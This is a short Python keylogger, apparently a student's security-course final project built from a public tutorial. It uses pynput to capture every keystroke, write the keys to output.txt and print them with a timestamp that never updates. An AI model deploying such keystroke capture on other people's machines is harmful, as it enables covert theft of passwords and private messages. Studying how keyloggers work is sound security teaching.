#References:
#https://pypi.org/project/pynput/
#https://www.geeksforgeeks.org/how-to-use-pynput-to-make-a-keylogger/


#Martin Bui
#CPTS 427 Final Project



from pynput.keyboard import Listener
import time
import os
from datetime import datetime

keys = []  # list of keys
now = datetime.now()

current_time = now.strftime("%H:%M:%S")

def on_pressed(key):
    keys.append(key)
    write_file(keys)
    print('key {0} pressed'.format(key), 'Curent Time: ',current_time)


def write_file(key_list):
    with open('output.txt', 'w') as f:
        for key in key_list:
            k = str(key).replace("'", "")  # remove the "''"
            if k.find("space") > 0:
                f.write('\n')
            else:
                f.write(k)

with Listener(on_press=on_pressed) as listener:
    listener.join()

""" 

 """